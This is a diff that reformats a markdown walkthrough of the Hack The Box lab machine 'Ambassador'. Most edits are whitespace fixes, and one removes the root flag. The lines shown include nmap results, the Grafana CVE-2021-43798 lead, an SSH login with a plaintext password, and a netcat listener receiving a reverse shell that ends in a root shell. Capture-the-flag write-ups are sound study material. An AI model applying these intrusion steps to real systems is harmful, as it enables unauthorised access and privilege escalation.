@@ -1,14 +1,14 @@
 # Ambassador
 
 ```bash
-	export IP = 10.10.11.183
+export IP = 10.10.11.183
 ```
 
 # Enumuration
 
 1. Nmap:
 ```
-	Nmap scan report for 10.10.11.183
+Nmap scan report for 10.10.11.183
 Host is up (0.29s latency).
 Not shown: 996 closed tcp ports (conn-refused)
 PORT     STATE SERVICE VERSION
@@ -129,8 +129,8 @@ Nmap done: 1 IP address (1 host up) scanned in 171.30 seconds
 
 ```
 URL: 10.10.11.183:3000
-```/login
-
+```
+/login
 	GRAFANA v8.3.0 Vulnerbility CVE-2021-43798
 ```
 # Exploition:
@@ -181,7 +181,6 @@ Commands:
 		> ssh developer@10.10.11.183
 		pass: anEnglishManInNewYork027468
 .....
-
 SQLLITE3
 .....
 	> sqllite3 grafana.db
@@ -245,7 +244,7 @@ Target Machine:
 
 NC Listener
 -----------
-	nc -lvnp 4444
+nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.65] from (UNKNOWN) [10.10.11.183] 44090
 bash: cannot set terminal process group (1840): Inappropriate ioctl for device
@@ -259,7 +258,7 @@ total 12
 drwx------ 3 root root 4096 Mar 13  2022 snap
 root@ambassador:~# cat root.txt 
 cat root.txt
-7a7726cfadb36dfbab218295411a0159
+
 root@ambassador:~#
 ```
 Target Found:
